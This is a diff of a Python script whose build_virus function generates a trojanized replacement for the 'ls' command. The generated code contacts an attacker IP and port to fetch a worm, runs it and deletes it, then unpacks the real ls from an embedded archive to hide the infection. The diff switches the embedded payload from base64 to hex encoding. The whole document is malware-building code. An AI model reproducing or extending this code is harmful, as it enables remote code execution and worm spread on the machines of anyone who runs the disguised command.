@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-import os, sys, base64, subprocess
+import os, sys, base64, subprocess, binascii
 from zipfile import ZipFile
 
 def zip_ls():
@@ -8,14 +8,16 @@ def zip_ls():
         return f.read()
 
 def build_virus(atkip: str, atkport: int, ls_zip: bytes):
-    b64 = base64.b64encode(ls_zip)
+    # b64 = base64.b64encode(ls_zip)
+    ls_hex = binascii.hexlify(ls_zip)
+
 
     code = f"""#!/usr/bin/python3
-import sys, os, socket, base64
+import sys, os, socket, base64, binascii
 from zipfile import ZipFile
 import shutil
 
-ls_b64 = bytes({b64})
+ls_bytes = {ls_hex}.decode('utf-8')
 
 def get_worm(ip, pt):
     skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -33,7 +35,7 @@ def run():
     get_worm("{atkip}", {atkport})
     os.system("python3 worm.py && rm worm.py")
 
-    orig_ls = base64.b64decode(ls_b64)
+    orig_ls = binascii.unhexlify(ls_bytes)
     with open("/tmp/ls.zip", 'wb') as f:
         f.write(orig_ls)
     with ZipFile("/tmp/ls.zip", "r") as f:
